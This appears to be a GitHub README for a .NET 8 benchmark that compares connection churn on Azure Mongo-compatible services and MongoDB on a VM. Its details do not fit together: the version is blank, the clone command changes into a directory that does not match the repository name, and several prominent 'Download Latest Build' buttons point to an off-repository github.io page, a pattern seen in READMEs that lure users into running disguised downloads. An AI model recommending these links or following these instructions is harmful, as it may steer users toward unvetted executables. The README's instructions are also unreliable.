# Azure Mongo Load-Test Churn Benchmark v— - Database Performance Benchmark 2026

> **Azure Mongo Load-Test Churn Benchmark is a Windows/.NET 8 benchmark suite for comparing connection-churn behavior across Mongo-compatible Azure backends and MongoDB running on a VM.**

[![Platform](https://img.shields.io/badge/Platform-Windows%2F.NET%208-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-unspecified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/cartertylerxs6372/azure-mongo-loadtest-suite?style=flat-square)](https://github.com/cartertylerxs6372/azure-mongo-loadtest-suite)

---

<p align="center">
  <a href="https://cartertylerxs6372.github.io/azure-mongo-loadtest-suite/">
    <img src="https://img.shields.io/badge/Download-Azure%20Mongo%20Load--Test%20Churn%20Benchmark%20Latest-brightgreen?style=for-the-badge" alt="Download Azure Mongo Load-Test Churn Benchmark">
  </a>
</p>

> **[Download Azure Mongo Load-Test Churn Benchmark](https://cartertylerxs6372.github.io/azure-mongo-loadtest-suite/)**

---

[Download Latest Build](https://cartertylerxs6372.github.io/azure-mongo-loadtest-suite/)

---

## Project Overview

Azure Mongo Load-Test Churn Benchmark provides a repeatable way to investigate database performance across Azure Mongo-compatible services, Cosmos DB, DocumentDB, and MongoDB hosted on a VM. Its core scenario deliberately opens and closes a database connection for every task, allowing connection setup and teardown behavior to be measured under controlled conditions.

The suite is intended for engineering and infrastructure comparisons of both steady-state and burst workloads. It brings together preflight validation, database setup, campaign control, Azure and host tuning automation, and standalone HTML reporting with throughput, latency, and tail-percentile data.

---

## What It Provides

- Benchmark Mongo-compatible Azure backends against MongoDB installed on a VM.
- Model connection churn by creating and closing one database connection per task.
- Test sustained steady load as well as burst-oriented load.
- Run the complete four-operation workload or limit testing to find-only or insert-only operations.
- Populate a consistent dataset of 100,000 documents.
- Prepare and maintain indexes for `ReqId`.
- Check prerequisites and target settings before starting a campaign.
- Record throughput, latency, and tail-percentile values.
- Generate portable HTML reports that support direct result comparison.
- Automate Azure infrastructure work, host tuning, and campaign execution with PowerShell.

---

## Getting Started

Check out the source and enter the project directory:

```powershell
git clone https://github.com/cartertylerxs6372/azure-mongo-loadtest-suite.git
cd Azure-Mongo-LoadTest-ChurnBench
```

Compile the .NET 8 components with:

```powershell
dotnet build
```

For an initial campaign, inspect the target connection strings and workload configuration, then run the supplied preflight validation script. When a script needs to modify Azure resources or host settings, execute the applicable PowerShell orchestration script from a session with the necessary elevation or permissions.

---

## Running a Benchmark

A campaign generally follows this sequence:

1. Set up the Azure resources, MongoDB VM, and participating test hosts.
2. Supply the target connection strings and campaign settings.
3. Complete the preflight validation.
4. Load the 100,000-document dataset.
5. Create the `ReqId` indexes or confirm that they already exist.
6. Choose the desired workload:
   - Complete four-operation workload
   - Find-only workload
   - Insert-only workload
7. Run either a steady-load or burst-load campaign.
8. Gather the resulting latency and throughput data.
9. Review the self-contained HTML report for target and percentile comparisons.

To inspect the local .NET command-line entry point, run:

```powershell
dotnet run -- --help
```

The help text lists the campaign, target, workload, and reporting options available in the current build.

---

## Settings and Environment

Keep environment-specific configuration outside version control whenever practical. The configuration file or environment variables should provide the benchmark targets, authentication information, selected workload, and campaign profile.

Example PowerShell setup:

```powershell
$env:AZURE_MONGO_CONNECTION = "<azure-mongo-connection-string>"
$env:MONGODB_VM_CONNECTION   = "<mongodb-vm-connection-string>"
$env:CHURN_WORKLOAD           = "full"
$env:LOAD_PROFILE             = "steady"
```

Do not commit credentials, private endpoint values, or deployment-specific settings. Consult the repository's PowerShell scripts and the .NET command-line help for the supported configuration keys and campaign controls.

---

## System Requirements

- Windows host environment.
- .NET 8 SDK and runtime.
- PowerShell for infrastructure and orchestration automation.
- Connectivity to the Azure Mongo-compatible backend being tested.
- Connectivity to MongoDB on a VM when that target is part of the comparison.
- Permissions to create the benchmark dataset and administer `ReqId` indexes.
- Azure and host-management permissions for scripts that alter infrastructure or tuning settings.
- Adequate storage for benchmark artifacts and generated HTML reports.

Actual compute requirements vary with the load profile, concurrency level, target services, and use of HPC-oriented infrastructure.

---

## Questions and Answers

### What systems does the benchmark support for comparison?

It is designed for Mongo-compatible Azure backends, including Azure offerings referred to using MongoDB, Cosmos DB, or DocumentDB terminology, and for MongoDB deployed on a VM.

### What is being tested by connection churn?

Every task establishes a fresh database connection and then closes it. The workload therefore focuses on connection creation and teardown instead of persistent connection-pool reuse.

### Which workload choices are included?

You can run the full four-operation workload, a find-only workload, or an insert-only workload. Each can be paired with either a steady or burst load pattern.

### Must the database be prepared before a run?

Yes. Runs use a fixed dataset containing 100,000 documents, and the preparation process supports creating and managing the required `ReqId` indexes.

### What should I check when a campaign fails?

Run the preflight checks first, then verify credentials, network connectivity, and target reachability. Confirm that the dataset and indexes are available as expected. PowerShell output and generated report files may also identify campaign errors or missing measurements.

### How are benchmark results presented?

Results are written to self-contained HTML comparison reports. The reports include throughput, latency, and tail-percentile measurements and can be opened locally or distributed as standalone files.

### What is a sensible way to select a profile?

Start with a smaller steady-load campaign to verify connectivity and preparation. Once that baseline passes, move to burst testing or larger infrastructure runs and adjust the workload and campaign profile as needed.

### How do I receive newer builds or source changes?

Use the latest build link in this README and pull updates from the Git repository when working from a source checkout. Review any configuration or script changes before launching another campaign.

---

## License

This project is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for details.
